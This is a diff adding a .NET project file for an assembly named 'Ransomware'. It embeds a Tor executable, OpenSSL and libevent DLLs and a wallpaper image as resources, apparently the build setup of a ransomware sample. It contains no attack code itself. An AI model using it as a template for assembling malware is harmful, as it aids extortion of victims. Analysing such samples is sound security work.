@@ -1,0 +1,46 @@
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <AssemblyName>Ransomware</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net40</TargetFramework>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>Preview</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="Ransomware.libcrypto-1_1.dll" />
+    <None Remove="Ransomware.libevent-2-1-7.dll" />
+    <None Remove="Ransomware.libevent_core-2-1-7.dll" />
+    <None Remove="Ransomware.libevent_extra-2-1-7.dll" />
+    <None Remove="Ransomware.libgcc_s_sjlj-1.dll" />
+    <None Remove="Ransomware.libssl-1_1.dll" />
+    <None Remove="Ransomware.libssp-0.dll" />
+    <None Remove="Ransomware.libwinpthread-1.dll" />
+    <None Remove="Ransomware.zlib1.dll" />
+    <None Remove="Ransomware.tor.exe" />
+    <None Remove="Ransomware.wallpaper.jpg" />
+    <EmbeddedResource Include="Ransomware.libcrypto-1_1.dll" />
+    <EmbeddedResource Include="Ransomware.libevent-2-1-7.dll" />
+    <EmbeddedResource Include="Ransomware.libevent_core-2-1-7.dll" />
+    <EmbeddedResource Include="Ransomware.libevent_extra-2-1-7.dll" />
+    <EmbeddedResource Include="Ransomware.libgcc_s_sjlj-1.dll" />
+    <EmbeddedResource Include="Ransomware.libssl-1_1.dll" />
+    <EmbeddedResource Include="Ransomware.libssp-0.dll" />
+    <EmbeddedResource Include="Ransomware.libwinpthread-1.dll" />
+    <EmbeddedResource Include="Ransomware.zlib1.dll" />
+    <EmbeddedResource Include="Ransomware.tor.exe" />
+    <EmbeddedResource Include="Ransomware.wallpaper.jpg" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="System.Core">
+      <HintPath>/home/petik/dotnet/shared/Microsoft.NETCore.App/6.0.8/System.Core.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+</Project>
